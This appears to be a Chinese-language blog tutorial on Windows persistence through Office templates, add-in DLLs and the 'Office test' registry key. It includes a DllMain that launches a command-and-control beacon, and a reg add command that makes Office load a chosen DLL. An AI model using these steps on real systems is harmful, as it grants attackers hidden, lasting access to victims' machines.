---
title: Persistence Office Templates
date: 2023-09-13T16:32:30+08:00
draft: false
url: /posts/2023-09-13/Office-Templates
tags:
  - Windows
  - Persistence
  - Office-emplates
slug: English-Preview
---
> Persistence Office Templates
<!--more-->
# Office Templates

### 默认文档

Microsoft Office 在`%APPDATA%`中包含一个存储所有模板的文件夹。Office启动时，基本模板都会用作默认文档

```cmd
%APPDATA%\Microsoft\Templates\Normal.dotm
```

将恶意宏嵌入到基本模板中，受害者可能会在一天中多次启动Office，这样就能达到权限维持的目的

## Office 加载项

Office 加载项用于扩展 Office 程序的功能。当 Office 应用程序启动时，系统会检查存储加载项的文件夹，以便应用程序加载它们

可以执行以下命令来发现可以删除加载项的 Microsoft Word 的受信任位置

```powershell
Get-ChildItem "HKCU:\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations"
```

Office 加载项是 DLL 文件，根据应用程序具有不同的扩展名。例如，Word 为.wll ，Excel 为.xll

生成恶意DLL，移动到 Word 启动文件夹，恶意DLL每次 Word 启动时执行加载项

```cmd
%APPDATA%\Microsoft\Word\STARTUP
%APPDATA%\Microsoft\PowerPoint\STARTUP
%APPDATA%\Microsoft\Excel\STARTUP
```

这将导致 Microsoft Word 崩溃，从而向用户提供软件已被修改或需要重新安装的指示

# 优雅的方法

一种优雅的方法是创建一个不会导致应用程序失败的自定义 DLL

DLL_PROCESS_ATTACH 会将 DLL 加载到当前进程（Word、Excel、PowerPoint 等）的虚拟地址空间中。加载 DLL 后，它将启动任意可执行文件，该可执行文件

将打开与命令和控制服务器的通信通道

```c
// Word 插件 – DLL
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdlib.h>
 
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        system("start beacon.exe");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Microsoft Office 应用程序使用此密钥在开发阶段加载 DLL 以进行性能评估。使用命令提示符执行以下命令将创建指向本地存储的 DLL 文件的密钥

```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\tmp\pentestlab.dll
```
